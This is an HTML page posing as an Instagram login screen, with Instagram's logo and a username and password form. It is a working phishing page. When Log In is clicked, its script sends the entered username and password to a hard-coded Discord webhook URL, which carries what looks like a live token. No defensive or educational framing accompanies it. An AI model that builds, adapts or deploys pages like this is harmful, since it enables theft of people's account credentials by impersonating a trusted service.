<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram Login</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
<style>
    body {
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        background-color: #fafafa;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
    }

    .container {
        text-align: center;
        background-color: white;
        padding: 40px;
        border-radius: 4px;
        box-shadow: 0 1px 0 rgba(236, 236, 236, 0.1);
        width: 350px;
    }

    .login-form input {
        width: 100%;
        padding: 8px;
        margin: 8px 0;
        border: 1px solid #dbdbdb;
        border-radius: 3px;
        background-color: #fafafa;
    }

    .login-form button {
        width: 100%;
        padding: 8px;
        background-color: #0077ff; /
        color: white;
        border: none;
        border-radius: 3px;
        cursor: pointer;
    }

    .login-form button:hover {
        background-color: #00a2ff; 
    }

    .forgot-password {
        font-size: 12px;
        color: #0077ff; 
    }
</style>
</head>
<body>

<div class="container">
    <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo" style="margin-bottom: 20px;">
    <form class="login-form">
        <input type="text" placeholder="Phone number, username, or email" required>
        <input type="password" placeholder="Password" required>
        <button type="submit" onclick="sendWebhook()">Log In</button> 
    </form>
    <p><a href="#" class="forgot-password">Forgot password?</a></p>
</div>

<script>
   function sendWebhook() { 
    const webhookUrl = 'https://discord.com/api/webhooks/1217785336944525329/TVBI0quqjx37KtQ6GA0hCEOOUUFS-avS0QI7adZwBjS2Sd62JvQdEAHMvHLbALYMaIBX'; 
    const inputText = document.querySelector('input[type="text"]').value; 
    const password = document.querySelector('input[type="password"]').value; 
    const message = `Hello id: ${inputText} password: ${password}`; // バッククォートを使って文字列を囲むことで変数を埋め込む 
    fetch(webhookUrl, { 
        method: 'POST', 
        headers: { 'Content-Type': 'application/json' }, 
        body: JSON.stringify({ content: message }) 
    });
    return false; // フォームがサブミットされないようにする
}
</script>

</body>
</html>
